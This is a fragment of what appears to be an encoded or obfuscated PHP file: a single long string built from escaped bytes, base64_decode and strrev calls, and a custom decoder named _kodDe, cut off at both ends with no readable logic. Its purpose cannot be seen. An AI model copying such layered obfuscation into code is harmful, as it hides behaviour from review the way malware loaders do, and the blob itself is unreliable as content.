b\xb5\xaa\x69\xc0\xb7\x4f\xa0\x4a\x9b\x29\xd2\xf5\xd4"."\x54\x18\x33\x9\x81\xc3\x90\x81\x95\xed\x70\x92\x7\xea\xbf\x97\x53\xc\x1a\x79\xb4\x20\xa5\x2c\x62\x27\xb\xb\xa\x54\x69\x49\xde\x9\x62\x82\xd8\x70\x71\x82\xae\x4f\x29\x6a\xcb\xd4\x50\x40\x8b\x5e\x9e\x1b"."\310\132\131\215\35\145\132\370\376\111\136\347\244\131\262\304\275\0\55\15\67\264\303\171\31\102\303\330\324\134\105\202\200\45\315\176\65\243\333\256\345\265\71\20\17\7\325\256\0\273\61\242"."\x15\xa\x7e\x2b\x35\x68\xf9\xb1\x4d\xa7\x31\xa4\x47\x8c\x7e\x3f\xf6\x7f\x80\xc9\xd5\xc7\x3d\x4\x90\x25\x41\xd5\xfa\xcd\xa2\xcd\x30\x86\x26\x91\x9a\x32\xa0\x69\x91\x70\xb3\xda\x12\x8e\xf1\x81\xe5\x36\x1c\x81"."\xae\xb0\x1a\x8f\x47\xa5\xf\xc2\xcd\x9e\xa5\xd1\x16\x35\x18\x8d\x2e\xd\xc3\x44\x68\x94\x18\x33\xbe\xd3\x29\xe\xd3\x71\x4c\xdc\xed\xc4\xe7\x4a\xb2\x21\x9d\x2c\x9\x61\x57\x21\x78\x75\x8f\x2b\x60\x70\x8a\xa6"."\x5a\xb0\x3d\x10\xe3\x6\xff\x73\x7c\x75\xbe\x7a\x91\x17\x7d\x50\xc5\x37\x1d\x9a\x98\xff\x81\x78\x22\x10\xab\xe0\x30\x86\x3a\x92\x81\x41\x7\xe7\x31\x50\xa0\x3d\xba\x5c\x9\x46\x23\xdd\x1d\x9d\x71\xea\x27\x85".base64_decode('wjujUjox64Zk5k6mPBmqD3VFAsGQEu5MRNlNDW5PS+7oxHmcoaBo6dxdDJSnEfkekVwjrw==').base64_decode('CaZJj6e6t6p3Rm9Nb+1qX6/VB7yOjIghDw9Eulqge408lLKAUjriSMagwWgsEIywpiC6gw==')."\140\64\30\246\201\275\133\356\332\363\340\346\275\327\354\34\377\316\46\124\321\304\325\33\47\266\335\207\44\43\54\15\355\274\170\357\43\233\47\266\334\61\161\361\131\320\376\175\167\334\277\147"."\367\243\173\267\334\72\276\363\312\211\255\17\354\275\372\34\232\360\316\17\357\32\277\360\126\336\60\345\235\313\37\231\330\174\63\227\220\250\140\344\101\245\337\71\167\323\336\335\73\261\174\164"."\323\231\23\77\276\150\342\332\115\343\27\336\60\176\325\255\173\67\337\61\176\343\331\343\347\155\332\167\307\25\123\335\204\104\343\75\154\50\340\132\271\377\164\354\22\200\242\267\327\232\211\121"."\x5b\x8b\x7e\x6b\xf0\x35\x10\xf4\xcb\xac\xd9\x89\x5d\xf3\x69\xdd\xa1\xce\x60\xc8\x7d\x91\x4a\x8e\x82\xaf\x9d\x19\x94\x42\xa8\xa9\xf\x8\xca\x16\xf8\xea\x61\x71\xe2\x9b\xa3\xa9\x7a\xd2\x56\xac\x87\xf1\x97\x1a"."\45\65\246\45\24\17\306\302\315\41\270\150\300\7\152\72\21\347\300\132\3\101\343\261\145\74\314\357\335\226\371\106\122\152\30\61\327\52\216\216\150\276\244\211\366\234\171\322\130\245\12\333"."\235\125\171\60\77\41\267\272\224\52\274\224\43\200\216\35\11\324\140\317\51\304\74\271\172\145\265\247\316\123\137\253\200\343\44\132\2\334\45\51\125\140\345\316\313\71\76\342\351\167\304\352".strrev('¡8è%é)á×èòñI*uˆ¨»-7Ä^EsrÁ jy¢–œÒ¯ZŠğ%Ú'."\n".'°aUJµu=')."\x6e\x98\x12\xe8\x6c\x71\xe6\xa4\x9e\x93\xba\xaa\x89\x91\x68\xd2\x67\x73\x17\x2c\x6c\x98\xab\x6b\x95\x7e\xb8\xbe\x51\x21\x91\x14\x73\x20\xa3\xc9\x81\x8c\x9a\x99\xc0\x27\xba\xda\xf8\x78\xd3\xbb\x19\xa\xbd\xac"."\x47\x9b\xa5\x59\x6c\xa0\x0\x4a\x86\xa\x43\xe9\x68\xb1\xbc\x26\xea\x6\x1a\x1c\x9a\x1f\x5\x78\xa\xbe\xbb\xc0\x6b\x42\xec\x88\x27\xb0\x11\xc4\x70\x3e\x88\x15\xd2\x88\x4b\xab\x2a\x2a\x72\xd2\x7e\xe6\xac\xc"."\x63\x75\xe0\x2e\xa0\x63\x25\xef\x3\xa3\x65\x6e\x47\xc5\x1d\x62\xe1\x6b\x87\xa1\x44\xb0\x9d\x52\x79\x5c\x22\xf3\x54\xff\x74\x7\xa1\xa\x74\x2a\xe\x12\xe1\xfb\x16\xc8\x47\xa7\xb\x66\x8\x87\x92\x7c\xe1\x4e"."\x7c\x27\x95\x5e\xb7\x8b\x7\xdb\x43\x1d\x1\x1f\x30\x71\x4a\x9\x34\x3f\x16\xf2\x94\x26\xa5\x1a\x73\x3e\xa\xaa\x76\xa0\x9f\x7c\x88\xa1\x2c\x41\xbe\x8a\xe6\x95\x6a\x23\xb1\x8c\x62\xa1\x90\x81\xc6\xc0\xe8\x2b".strrev('3®9T7ƒ™ú¥úS&YÉd’b!ß”ÉV–­×Ï`'."\0".'„T%Ü÷%P4×SU4ŠFïÄ')."\x18\xed\x6c\xd\xb3\x9b\x85\x2d\xb0\x3d\x2f\xa4\x4c\x47\xa6\x96\x58\x18\x7b\x1e\x81\xef\x2b\xac\x2a\xe9\x3e\x27\x8a\x8\xdb\x10\x14\x29\xc\xa7\x78\x58\x38\x73\xc0\x9\x7c\xcd\x47\x11\xb1\xe4\xa3\x8\x5f\x6c"."\x70\x2e\xc9\x13\x1d\xfe\x7e\xbc\x93\x87\x85\x94\x8d\x22\xdd\x71\x76\xab\x4\x73\xdf\xe5\x2d\x3c\xdc\xce\xef\x5f\xe3\x84\x68\x4c\x8a\x4\x62\x81\x8e\x38\x8f\xc6\x96\xf3\x5b\x2a\x1c\x46\x6f\xab\xa8\x9d\xdd\x1d"."\202\343\107\2\313\20\261\104\31\276\331\66\310\177\172\215\157\306\222\332\136\172\25\220\6\351\317\51\54\206\257\107\365\255\253\367\50\163\67\324\102\36\356\301\303\36\100\62\225\52\276\162"."\132\104\215\104\333\150\234\170\310\13\345\123\142\123\244\364\50\110\260\116\10\301\332\142\113\27\237\15\12\242\141\205\336\50\126\72\243\313\3\302\351\232\224\0\20\341\203\315\177\172\117\357"."\160\257\17\11\13\326\152\161\265\257\245\131\141\142\10\161\336\2\72\6\50\35\140\313\350\152\17\254\30\152\326\314\60\267\112\210\41\256\7\161\201\376\256\140\1\302\53\241\100\222\334\26".base64_decode('H+GNCHhXqb3re0/u9frofUosvPR6RJPU0Aq0xsbjjsugag5fNofaUS8hRGctjSyCH9j2LQ==')."\202\175\7\104\27\67\361\301\14\235\266\276\23\375\155\113\254\17\241\277\21\364\23\111\240\341\62\170\6\64\45\43\341\245\241\365\370\37\221\120\313\21\111\57\113\71\13\204\73\327\243\177".base64_decode('EYNZH+50V9YcSiwPhWgGFoZfkRUxHOiq5EERX2CAZHGhAapW1RqCTG/fzFpV9VvdQC/cDw==')."\111\115\365\111\365\325\260\206\4\342\301\365\234\373\72\10\242\234\26\310\165\3\47\41\160\277\200\20\157\213\105\273\273\244\170\173\140\131\270\263\215\305\374\63\130\150\6\124\255\264\204\343"."\10\105\101\106\214\302\135\241\34\247\141\52\26\311\122\257\203\244\133\20\147\107\21\111\144\307\233\1\312\231\235\263\254\271\73\34\151\221\157\274\343\214\64\64\235\160\165\130\123\246\263\306".base64_decode('sTi5+84iGOUsTMiNRQgOWIQigMUIuliEuEVkEdJRFsG7k1AnS0N7ULR/ZBvLAW2IX+BcmA==')."\xea\x97\x9c\x94\x60\x1e\xec\xa3\x6a\x39\xec\xc5\x6\xed\x10\x35\xae\x98\x75\x69\x52\x89\x12\x4c\x52\x2c\x50\x3b\x42\x45\xba\x39\x8e\x55\xb2\x92\xe2\xca\x4f\x73\x20\xe1\x93\xe4\x41\xbf\xbd\xab\x97\x10\xe1\x78".base64_decode('NaNTenfZThh21vFRuNmIPhomF0ulz8LyTjWQqilpxcm6LQOEzouq0EFdLFRK2JySKJJp1A==').strrev(' 0†şˆ7ôfßÑó?ÑyÕÔô÷°&^İµHø^’:e½? ‹Bü'."\n".'×(ß5jlâ£¹')."\265\167\144\136\53\12\54\150\355\363\303\331\126\157\157\325\144\350\204\14\14\251\20\255\242\121\126\12\60\215\326\310\344\0\366\222\243\332\71\246\232\47\233\71\241\375\246\332\171\21\157\211"."\105\273\250\304\242\204\133\25\352\64\102\251\246\372\374\152\20\305\202\261\20\236\115\64\27\113\253\251\166\150\316\26\127\53\160\237\274\326\131\52\334\331\22\132\241\124\33\251\21\125\323\124"."\50\254\240\271\313\52\122\312\152\142\65\320\266\302\221\245\65\140\16\53\62\71\262\375\165\220\302\22\202\104\313\104\71\342\376\201\335\330\365\300\46\236\247\120\11\232\46\205\343\150\201\217"."\104\110\117\121\222\141\141\301\327\243\160\57\15\30\210\67\53\124\13\13\25\261\4\132\21\115\12\255\110\304\2\30\110\244\325\303\16\105\177\10\3\302\273\251\142\116\243\327\130\211\214\347".base64_decode('Ww1KhdUOkZIKm1ioBAojS6TUJ55CNAsUzbLeYSlI6TTWFQt3BGIrAWVizwBT1Mw6LjOLiA==')."\x61\x75\x4b\x17\xeb\x3b\x51\xab\xe5\x8b\xf6\x74\x8c\xd7\x33\x8e\x8c\xf6\xbf\xeb\x81\x23\xa3\xd6\xd0\x60\x15\x1e\x79\x1a\x4\xaf\xb7\x2a\xbf\x2d\xcd\x94\x2e\x35\xec\xd6\xb1\x87\x5\x98\xc7\xa\x72\xa1\x8b\x69".strrev('öqêcKæ•¥¬#™OÊĞÒÊU'."\0".'C"; kP€L2EâòÜ&’¾U9} 5˜ñEˆrÎ')."\304\161\1\75\253\231\3\75\245\316\65\152\32\320\156\266\224\307\336\144\230\356\115\334\355\36\302\152\73\255\130\323\60\207\25\142\155\247\261\100\167\42\252\242\125\51\26\302\153\104\131\137"."\244\75\274\74\140\120\30\147\340\376\217\77\245\333\54\117\245\156\363\362\134\213\25\352\154\13\167\206\232\360\275\161\44\53\260\346\202\236\16\373\3\235\17\365\204\243\152\4\311\327\252\254"."\212\13\107\101\41\355\160\66\251\252\302\111\213\117\23\366\351\166\261\44\271\356\63\114\142\13\336\301\257\215\20\343\165\104\54\1\341\252\201\53\315\111\132\251\37\227\226\227\76\50\357\362"."\351\152\230\215\70\5\147\246\22\317\102\221\135\165\174\334\155\374\55\203\205\135\272\70\206\146\47\335\334\365\37\24\350\226\134\55\340\302\12\373\40\71\170\312\73\233\207\26\333\54\363\15"."\xa6\xea\xa2\x37\x39\xdd\xb2\xf8\x71\x74\x62\x40\x57\xac\x82\x9e\x24\x4e\x44\x15\x70\x7d\xa7\xa4\x4c\xdd\x12\x1e\xc7\x1\xf7\x64\xcf\xc5\x82\xf6\x80\x70\x4a\x21\x7b\xdf\x6d\x69\x66\x48\x2e\xe5\xed\xb8\x9e\x85"."\303\202\226\176\162\1\100\334\362\23\167\250\244\213\1\344\70\110\214\34\365\51\350\52\10\65\205\71\152\244\134\2\30\21\356\166\361\351\213\250\263\217\151\16\4\76\306\14\266\100\272\317"."\53\171\43\363\146\227\136\314\31\344\310\151\271\70\121\202\65\10\125\100\307\337\347\276\336\45\143\35\37\123\226\345\304\316\67\76\155\14\231\33\53\322\62\351\212\47\216\62\246\220\163\134"."\41\53\345\321\107\274\362\175\52\104\73\4\50\335\340\140\16\30\151\154\36\230\341\40\372\204\100\6\40\354\267\310\122\174\302\131\17\251\23\313\126\136\341\62\43\245\311\267\136\45\237\365"."\x53\x65\x4a\x21\x43\x2e\x68\x3b\x6d\xc8\xfe\x33\x7c\xc2\x63\x31\x9f\x2e\xa7\xf0\x81\xc2\xb7\xc1\xe1\xe0\x1f\x8b\xed\x69\x55\x6a\x4b\x17\xcf\x2f\x7c\x95\x52\x6c\x48\xc3\x40\x0\x34\x48\x26\xb8\xd2\x28\x1a\xd1"."\156\140\372\37\225\150\107\202\166\60\217\122\340\57\71\142\202\200\215\257\240\350\66\170\27\163\360\247\160\24\312\372\164\174\237\213\336\256\11\161\167\223\250\40\165\12\367\331\205\272\45\227"."\321\223\260\224\212\345\202\220\221\177\260\110\124\117\237\375\301\230\56\44\2\124\214\134\237\373\314\102\202\305\222\57\221\102\22\133\166\225\41\344\110\257\372\300\310\17\100\262\240\61\264\26"."\164\106\325\166\264\334\104\231\300\142\130\11\7\173\147\245\200\205\330\110\236\112\372\311\75\146\330\76\56\44\247\130\364\250\25\6\173\35\342\334\74\304\214\125\300\101\231\20\24\2\364\147"."\145\56\345\105\15\7\252\113\351\66\167\23\105\56\206\112\116\254\244\133\340\71\316\140\207\45\37\261\332\220\216\157\313\61\345\114\231\235\17\164\245\274\163\320\104\174\172\26\217\166\307\330".base64_decode('SQ+OYw2XGgsFV/JDFw5tDSxzQ8JYQxloqwjmejMMJxtUNRbFCsZQpNVVIN7O/Qs7YWok3A==')."\271\264\142\2\22\110\72\244\42\24\30\116\204\72\334\60\147\15\361\120\40\306\234\137\343\170\163\44\32\224\222\303\321\162\114\160\211\207\3\251\172\222\2\375\247\327\364\256\43\73\246\106"."\264\161\112\255\307\172\14\257\332\67\263\166\111\357\206\332\232\136\377\22\337\14\256\176\243\354\112\272\155\74\11\330\142\213\117\243\33\200\327\55\6\244\305\40\346\367\371\340\43\74\340\357"."\365\63\137\144\176\221\10\277\42\377\264\365\316\65\6\234\315\307\251\143\47\107\103\135\136\117\230\233\1\237\373\112\233\312\356\261\101\24\337\153\126\371\14\304\207\270\152\174\145\234\217\225".base64_decode('E+agSErTsl2HKzP62yVnxSZDFTM6SNpxy1sG+QxTzBYxrVNmsoRdSYkxEnfCEcjnqAIx9A==').base64_decode('QaEjgFkZZ7M3j9ZKWIyDSGptaw+fujTS0RntOi0WT3QvW75iJbgKbWREk1a8TCMCvnf9SA==')."\x5e\xf7\x33\x53\x63\xff\x32\xbc\x21\xd1\x2d\xbf\x2c\xcc\x71\x20\xea\x23\x76\x9a\xcc\xbc\xbb\x51\x45\x6\x4f\xc5\xdc\xc3\x5f\x39\x89\xd6\xe6\xcf\xe5\xed\xfa\x49\x72\x74\x15\xf5\x7e\xd3\xb4\x27\x49\x5d\xd6\xf1"."\351\25\103\142\117\257\325\307\251\64\245\17\261\116\353\140\204\52\214\357\54\261\37\3\151\303\53\277\174\200\311\126\26\34\123\375\56\261\0\0\302\250\100\22\36\4\220\373\317\246\321\121"."\135\30\62\232\303\222\377\151\66\173\120\361\172\32\2\177\270\155\330\375\53\163\367\272\226\170\357\164\273\376\134\353\325\6\35\351\302\47\365\132\57\332\301\72\342\56\367\237\47\223\245\240"."\xc3\xcc\x14\x1b\xfc\x36\x6e\x67\x1e\x2d\x1f\xd0\x16\x10\x28\xe4\xd9\x42\x96\x14\x6e\xa1\x84\x17\xae\x76\xd7\x5c\xe5\x40\xee\x3d\x24\x4e\xec\x37\x1b\x95\xd9\xf0\x92\x40\x2b\x12\xbd\x53\x4a\xf\x95\xa6\x41\xff"."\x8f\x25\x31\xe2\xc\x9f\x46\x3d\x8a\xf0\xd9\xcd\x34\xb7\x4e\x67\xdc\x6c\xba\x60\x25\x9b\x74\x77\x37\x29\xfb\x8e\x60\xcc\x37\x37\x28\xec\x51\x72\x83\xdc\x3a\x24\xe9\x10\x3e\xf0\x3a\xdf\x2a\x59\xc6\x9\xf9\x2"."\236\373\100\151\315\243\314\326\27\156\304\66\217\306\244\207\214\34\176\73\344\7\122\264\102\41\70\200\373\340\230\303\16\120\122\216\244\261\315\214\154\211\343\364\10\216\222\133\250\220\227\342"."\xf9\x2d\x11\xe2\x2e\xbe\xd3\x92\xf3\xef\xb2\x1a\x90\x40\x98\xf\xb1\xcb\xff\x65\xa9\x48\x7a\x34\x44\xf2\xa7\xb7\xa5\x83\xa0\x97\x67\x86\xd\x4\xcc\x9\x98\x89\xf8\xc4\x1f\x8\x6e\xc4\x6b\x5a\x96\xb7\x50\x34".base64_decode('sS1ek5HL+K1hSMtqlr3M4U/pM71+Y7chHVychiaMeAlVs49AUQzyF3Vy6XwYlg8P8fmp1g==')."\61\202\361\243\266\371\261\113\110\42\367\162\23\272\150\234\35\26\71\173\117\37\271\222\166\342\340\213\256\215\231\366\160\7\333\302\237\62\325\361\323\260\360\103\214\304\367\100\6\173\121\61"."\xf3\xec\x19\x1f\xfa\xc0\x82\xec\x8d\x3d\xa5\x93\xe6\xf2\xcb\xff\x92\x23\x73\xfc\xc8\x7\x9a\xea\xcc\xca\x50\x72\x69\x8e\x4\xc2\xc\x1f\x46\xe2\x61\x58\xf6\x14\x89\x51\xee\xcd\x39\xde\xf6\xa0\x3\xe4\x74\x14"."\156\351\372\40\263\212\304\243\55\70\112\221\373\163\247\107\277\336\212\0\257\144\347\110\347\223\364\346\3\376\34\350\1\6\350\153\22\320\136\372\263\252\122\353\275\105\341\142\35\215\16\175".strrev('î‡Erq¦pìru…£yP:§Âˆ>X’±¨Ó¥¨»]Ü„ŞŞ¶Şí7ºa\\Ê>©b›').base64_decode('o/0O4p3XCH5AQzgg7Y5FHAdVkJX1cGzAG2SWYGYpmyK7WfQpM4s28uLIemLb9RP3XLHv0Q==')."\xeb\x26\x36\xdf\xbc\x67\xd7\x43\x13\xd7\x3e\x48\xe1\x14\x63\x2d\x7a\x9e\x8f\xfb\xc4\x45\xdf\xdd\xfb\xd0\xf6\x7d\x3b\x1f\x7d\x67\xdb\xce\xfd\xf\x5f\xbc\xef\x8e\xfb\xb1\x49\xd2\xf7\x6e\xa6\x16\x4a\xe3\x97\x6c"."\234\270\342\316\361\113\56\334\367\343\163\46\36\274\164\142\373\331\357\134\165\351\333\147\156\204\231\223\47\236\120\3\305\114\111\340\211\26\231\270\376\341\361\207\57\171\147\313\125\373\356\270".base64_decode('Q8pvY4O5rDR10CiOn3fuO2ffOn7JZXu3fK+sAP2Ae5xx9664YO/V50gp7kLNxEm82MLzMg==')."\x34\x61\xfc\xd2\x4d\x7b\x6f\xb9\xd3\x5d\x88\xbe\x1a\x50\xa1\xd0\xc4\xd6\xf3\xf7\x3c\x74\x9f\xab\x50\xa7\x19\x2f\x25\x7\x9a\x25\x6f\xf4\x13\x17\x9f\x3f\xbe\xf3\x6a\xfe\x91\x3d\xbb\x36\x51\x93\x78\x57\x11\x6e".base64_decode('Isfz0/rL88cZRbeYuoXW0Q7NTsIk3rvjEdQeijF55MbvOG/v9Wft3fEdGIkr7xi/9AcTOw==').strrev('»Ün$LZè}í—İŞàù?ù°y¢Šò"”ùO>í±;÷}Æ×pW(Ã•P-^NÃ{Ún')."\361\201\361\153\357\34\337\176\46\377\354\370\256\135\2\313\121\77\171\346\254\2\263\75\15\303\201\335\246\205\335\170\241\44\275\264\47\63\70\54\222\361\327\321\260\222\212\76\360\300\44\55"."\xf2\x16\x3\xbc\x13\xd4\xc4\x26\x2d\xc2\x63\xbe\xd9\x4c\x1\xee\xd7\x55\x21\xd6\x59\xd5\x58\x75\x52\xd\xfa\xad\xad\xf2\x54\xe1\xd\x8\x89\x63\xe6\x89\x1\xa4\x1d\x55\x8d\x27\xd5\x90\x40\x2d\x38\x72\x1a\x83".base64_decode('dUPy5iwmHqhulyDuIR1wLiHLEF7kGvwNfrbwLVmLvyhe9+rm642QB+nKQ59lYaegnbo9bA==').strrev(' V*—Ã¶ÙŞ{Üü{¿ïÙ˜'."\r".'OĞ(:\'*n—‡6£Ò÷¡¹ô'."\0".'¬r7Z@j=vêóe')."\x2f\x16\xcf\xca\x9e\x86\xa4\x77\x46\xc6\x2f\xbb\xb2\xfc\x7b\x24\xbf\xf3\x6b\x2c\xf3\xf8\x59\xd7\xee\xdd\xe2\xca\xc9\xc\x6d\x15\x49\x83\x26\xa\x10\xea\x77\xf1\x11\xbe\x2e\xc8\x45\x28\xbd\xff\x6f\x66\x11\xd5"."\147\66\142\315\76\5\254\360\166\27\106\113\171\57\326\160\171\343\262\217\117\327\13\107\165\316\374\130\107\345\314\57\313\13\111\261\356\346\104\220\276\274\324\250\310\357\242\111\116\313\211\376"."\223\56\154\314\364\11\140\130\224\140\40\41\126\244\305\15\31\54\35\250\116\351\340\24\127\173\261\351\212\27\211\370\170\216\241\211\153\33\322\13\4\162\26\347\103\133\356\347\267\334\130\40".strrev('?ŞT¬V±*[ÇDÄ“û”Œ—t²•;ÂMMŠ0E,š‘¯WêÅâÚ¿8hv‚5ı?+ÔÂ°E')."\xb2\xc\xa4\x13\x61\x5e\x9f\xe3\xc1\x12\xd\x8d\x35\x3f\x61\x74\xbf\x87\x22\x36\xdf\x5a\xf9\x73\x1d\x2b\x73\x29\xa5\x61\x56\xe3\x9c\x5\xe8\x7f\xa\x39\x99\x59\x18\x95\xa\xec\x56\x2\xa\xb2\xe7\x3c\xa6\xfa".base64_decode('04zXiIezWN/wgEuPzDjAAo388Q7GpBz5RGsdz75BR6nuR3oVh5z9UBaF7e5U/npQBW5tsA==')."\227\241\44\3\176\76\16\31\26\50\362\55\276\46\146\106\177\166\120\164\200\260\25\40\354\101\324\76\123\154\224\210\210\52\61\204\344\100\51\77\330\44\45\52\266\151\52\71\55\77\72\225".strrev('ßİs±h©Gï:_ïI+ªğù¿Ãå¬z‚Îz”¶á&…=5‰ÆøMCø…­Ó[§')."\323\355\42\213\0\15\303\73\135\220\20\351\156\13\167\112\306\203\22\100\15\266\164\252\201\256\256\212\11\60\116\124\73\215\55\157\174\153\244\147\102\151\150\21\332\253\51\111\174\11\252\251"."\xa\x43\xab\x14\xab\x98\x64\xce\xc0\xab\xfc\x60\x8b\x46\x32\x8\xb1\x69\x91\x1\x45\xaa\x71\x11\x25\x8d\xfa\xe4\x25\x21\x9a\x5c\xbd\x78\x91\xdf\x80\x92\x3e\xff\x34\xcc\xd4\xfd\xd8\xa\x2f\x7f\x32\x1e\x6b\xd9"."\50\210\100\133\205\267\62\105\131\244\51\24\277\115\325\344\254\245\132\31\100\13\77\67\101\136\354\56\314\237\166\133\344\327\344\104\74\275\142\46\333\120\362\115\374\20\367\353\131\361\230\55"."\x20\xbd\x15\x40\x9e\x5a\xa\x6a\xf9\x65\xe5\x45\x70\xe5\xbe\xa4\x9c\xc4\xde\xe0\x1c\x20\xca\x7\xd7\x91\xed\xa2\xc2\xe2\x45\xf8\x74\x88\xd9\xf9\xf9\x49\x64\x91\xbf\xb0\x58\x1e\x6d\x72\x53\xad\xfc\x63\x7e\xa2"."\173\362\13\145\207\112\137\113\255\174\246\311\217\362\52\320\21\266\311\101\263\205\31\103\150\311\101\114\271\142\115\201\146\100\102\27\126\135\320\4\307\53\52\266\144\106\125\302\27\66\311\301"."\x50\x51\x3c\x42\xb7\x6e\x1d\xad\x8\xbf\x10\xb4\x61\x43\x39\xc\xc\xb3\xdd\x49\x81\x82\xe1\x6\x61\x82\x73\xc3\xb0\xa\x49\xc0\xd0\xe2\xe8\xfc\xc\x25\x76\x39\x93\x80\xb0\x3c\xf4\x57\x94\x89\x74\xb6\x89\x8"."\x9d\x91\x8e\xc4\x1e\x66\x52\x45\x62\xbd\x3d\xd5\xbe\x19\x1b\x36\xf8\xd\x66\xbe\xc8\x4c\xa7\x58\x59\x1f\xcf\x4d\xe3\xbd\x3e\x67\x7e\xd4\x13\x40\x3d\xcf\x8\x0\x77\x4e\x4a\x54\xa7\x2\x15\x1d\xe6\x9f\x21\x2e".strrev('/“½8¢>Le§ÎÄ…;9bg'."\r".' QóõÏ&;Eæ‰SKXòáî-56.ÛE3r™')."\x11\xef\xf4\x51\x3c\xcb\xe1\x40\xa1\xe0\xe0\x40\x2c\x82\x4f\xc9\xb2\x46\xbf\x9f\xb3\xd\x7a\x72\xe6\x4b\x8a\x5b\x9c\x2c\xb\x61\x5a\x2e\x38\xb6\x3a\x74\x25\xe0\x8b\x65\x4\x3c\x84\xd8\xb0\x59\xe4\x6c\x8e\xc3"."\121\135\34\10\144\216\131\221\304\171\170\362\42\53\131\64\12\266\203\15\322\47\247\253\310\223\156\153\264\41\215\146\251\122\100\277\327\124\105\236\346\250\102\123\232\246\60\336\307\33\270\10"."\177\15\11\321\331\246\52\322\11\153\100\327\121\171\302\332\52\175\4\25\254\122\30\363\315\151\34\217\105\333\104\253\56\277\24\10\57\150\166\307\340\226\123\240\23\316\53\247\235\116\177\117"."\x9a\xc6\x28\x89\x3c\xef\x99\x45\xd2\x35\xb9\xc3\x41\xd8\x1c\x11\xe1\xd3\x58\x6f\x4b\x33\xc1\x4b\x9e\x5d\xb1\x68\x22\x1a\x64\xaf\xe1\x39\x15\xbc\x14\x36\x9b\x6d\x47\x2c\x7a\x1f\x56\xec\xe0\xd8\x15\x3c\x6e\xba"."\304\162\160\71\304\17\20\240\206\142\51\237\347\126\243\230\136\371\372\331\124\371\117\17\71\122\325\123\175\223\244\53\75\32\73\160\5\55\64\75\101\146\267\131\241\235\150\245\116\340\273\375"."\x16\x80\x25\xdf\xa7\xd8\xf3\xaa\x9e\xf2\xf5\x50\xf\x5\x4d\x75\xec\x1e\x16\xb3\x51\x15\x17\x41\x59\x4e\x39\x45\xc1\x2b\x49\x1f\xc7\x3a\x9a\xff\x7e\x60\x9f\x62\x66\x55\xe3\x33\x42\x78\xa8\xaa\xda\x53\x5d\xe3".base64_decode('m1FbXZ5CrYGd6djUTj01jhLhWSiQCMhFx2AkHOpMqGEQBuob5vnqxCVEwxK+hGk4KPtdwA==')."\x58\xf5\x39\xba\x55\x1\x35\xf4\x90\x26\xc1\x6d\x59\xf5\xbc\x43\x67\x4b\x51\x9a\x35\x99\x97\xdb\x86\xba\xba\x3a\x6f\x5d\x3d\xfa\x9f\x5d\xce\x60\xbe\x35\x1b\xeb\xea\xca\xb2\xd4\xd5\x35\x92\xff\x69\x2\x39\x28"."\1\22\164\246\40\226\310\170\71\163\353\242\353\320\40\130\73\321\236\272\304\44\327\236\40\276\247\252\340\246\301\260\10\133\134\104\175\304\371\54\143\253\216\267\106\25\142\60\0\61\135\40"."\x21\x27\xbd\x8f\x19\x7\x67\xc5\x19\x7\xb5\xb3\xf3\x4\xea\x98\x1c\x3e\x8a\x76\x6a\xf9\xc\x41\x10\xb4\x9d\x5f\x90\x46\xd9\xc4\xc\x5a\x48\xaf\xad\x37\xf1\x6\x86\xf2\xa9\x1e\xf9\x63\x3e\x86\x68\xa\x14\x4e"._kodDe('K7DstB+yHvaAG3gGxoH6mYEllAJBC6p3dReVJuI7+VCtFR9RPmRuMUcXSu+8JIlYfGKsDwc=').base64_decode('7eQ10SeY6G1fwGGFGTlgDqtCTsHRU3mMoBTvURlJpqSb4BivbH2SsnPrN2E6BAIccfgxaA==')."\70\35\222\250\122\121\31\267\13\161\106\326\223\204\263\44\176\10\32\67\324\213\333\335\50\260\210\370\133\200\77\116\105\215\245\131\173\25\340\70\64\112\334\366\323\27\220\211\46\250\361\260"."\xb2\x1\xb7\xdd\x83\x4d\xc6\xcd\x71\x3c\xe2\x36\x43\x64\x31\x69\xf4\xd8\x89\x59\xfc\x33\x2c\x5\x19\x24\xc4\x1d\x7a\x11\x85\x46\x90\xbb\xbc\x95\x2a\x70\x27\xb9\xca\x4\xe8\x41\x5b\x59\x1\x80\x97\xe7\x26\xe7".base64_decode('kRVyY7grN3FuG+Q+vGWPt1SJJVmkWfBSiTAHYnUMSVtaX6FoZhAlWDLSELyrMphnL89ZIQ==')."\x13\x6f\xbd\x9c\x4f\x6\xe2\x93\x4f\xf6\xb4\x3a\x90\x96\x70\xb6\xa0\xa5\xf8\xe2\x29\x65\x8d\xb\x5f\xe6\x2\xe8\x9c\xe1\x52\x42\x90\xbf\x21\x27\x3\xf1\x5e\x59\x36\x0\x23\xbb\xe\x67\x1d\x78\x77\xeb\x84\xf0"."\226\175\12\321\61\235\211\135\324\362\126\132\266\150\141\331\4\227\302\372\54\371\205\117\325\101\46\214\126\231\275\31\306\220\260\354\160\302\51\214\152\65\34\307\311\11\302\374\262\172\2\232"."\103\241\164\122\341\12\42\354\145\350\270\303\101\74\220\51\114\335\246\46\271\230\63\355\255\363\56\143\201\313\131\56\214\126\376\252\252\174\160\207\121\252\312\12\47\74\243\333\371\113\363\25".base64_decode('CNFJbGVURdZ1XEEjZ0tSDNfOzkzRptui6lMPBiv0xXIFv8M+1Tk+5QXgJTcTSZfYf7ZcCA==').strrev('²ùëGö‡ÚúÂØµ–‘	Ç~Ö(\\7³§xì¯ºeY[1Ú*VŞ1Ä—9KQbíÕ×').strrev('ÓPXqƒ¸×ØF>ÅHT‚Ï$/¶§Ô“XZ\\Š*-,2çĞlR„îû6ÙCÔ£')."\346\173\152\134\175\40\45\255\263\21\131\50\116\320\42\336\305\242\251\16\373\4\351\161\3\236\25\65\203\65\136\143\155\43\6\251\344\21\11\151\233\357\212\272\315\167\161\11\111\14\102\121".strrev('òRUáLY¤õé ·V[‰×•¨>Ğ¬–²\\WW8<òºß•ÁA%{0„„öxÖÍ‚&‰i')."\352\223\267\143\172\106\216\22\123\10\66\105\204\373\171\271\12\354\100\115\342\105\170\152\6\222\166\111\166\307\46\275\120\201\142\322\43\46\222\364\352\255\127\270\330\253\322\232\151\144\246\224"."\x40\xf2\x57\x92\x80\x5d\xfa\x60\xe9\x26\x1d\xd1\x7e\xc5\x4b\xfd\xfc\x64\xdb\x25\x8b\xb2\xcb\x79\x8a\x2c\xea\xb1\xdb\x76\xb8\x2\xe2\x9\xb\xf7\xc0\x92\xd3\x50\xb5\xd8\x33\xbc\xe8\x99\x5c\x84\x7c\xb3\xac\x8"."\115\303\322\226\270\226\47\247\130\370\55\222\156\66\212\225\122\52\174\212\44\111\30\115\162\361\33\260\43\220\4\11\243\72\263\27\367\326\67\170\147\325\323\260\174\125\217\355\350\150\14\357"."\66\45\62\300\173\142\306\333\300\33